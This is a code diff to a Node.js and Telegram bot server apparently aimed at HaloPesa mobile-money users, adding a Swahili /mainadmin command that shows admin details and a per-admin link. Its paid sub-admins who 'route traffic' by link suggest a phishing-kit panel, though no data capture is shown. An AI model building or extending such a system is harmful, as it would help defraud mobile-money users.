@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Updated with /activate, /payment, and /suspend Command Controls for Sub-Admins.
+ * Updated with /mainadmin Command to display Main Admin Link and Telegram Info.
  */
 
 const express = require('express');
@@ -69,6 +69,7 @@ function isValidHaloPesaNumber(number) {
 
 /**
  * Sub-admins must be both authorized and paid to route independent traffic.
+ * Main admin chat ID can always route.
  */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
@@ -156,6 +157,30 @@ async function initBot() {
       return;
     }
     await updateContinuousAdminList(chatId, null, 0);
+  });
+
+  // /mainadmin command to display Main Admin Link and Telegram Info
+  bot.onText(/\/mainadmin|\/mainadminlink/, async (msg) => {
+    const chatId = String(msg.chat.id);
+    if (chatId !== String(FALLBACK_ADMIN_ID)) {
+      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
+      return;
+    }
+
+    const userId = msg.from.id;
+    const username = msg.from.username ? `@${msg.from.username}` : 'Hakuna';
+    const firstName = msg.from.first_name || 'Msimamizi Mkuu';
+    const lastName = msg.from.last_name || '';
+    const mainAdminLink = `${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`;
+
+    const infoText = 
+      `👑 *Taarifa za Msimamizi Mkuu*\n\n` +
+      `• *Jina:* ${firstName}${lastName}\n` +
+      `• *Username:* ${username}\n` +
+      `• *Telegram ID:* \`${userId}\`\n\n` +
+      `🔗 *Kiungo Chako Kikuu:*\n${mainAdminLink}`;
+
+    await bot.sendMessage(chatId, infoText, { parse_mode: 'Markdown' });
   });
 
   // /activate <chat_id> command for Main Admin
@@ -267,7 +292,7 @@ async function initBot() {
       const lastName = msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu.\n\n*Amri Zilizopo:*\n• \`/admins\` - Orodha ya wasimamizi\n• \`/activate <chat_id>\` - Washa msimamizi\n• \`/payment <chat_id>\` - Thibitisha malipo\n• \`/suspend <chat_id>\` - Sitisha msimamizi`, {
+        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu.\n\n*Amri Zilizopo:*\n• \`/admins\` - Orodha ya wasimamizi\n• \`/mainadmin\` - Tazama taarifa na kiungo chako\n• \`/activate <chat_id>\` - Washa msimamizi\n• \`/payment <chat_id>\` - Thibitisha malipo\n• \`/suspend <chat_id>\` - Sitisha msimamizi`, {
           parse_mode: 'Markdown'
         });
         return;
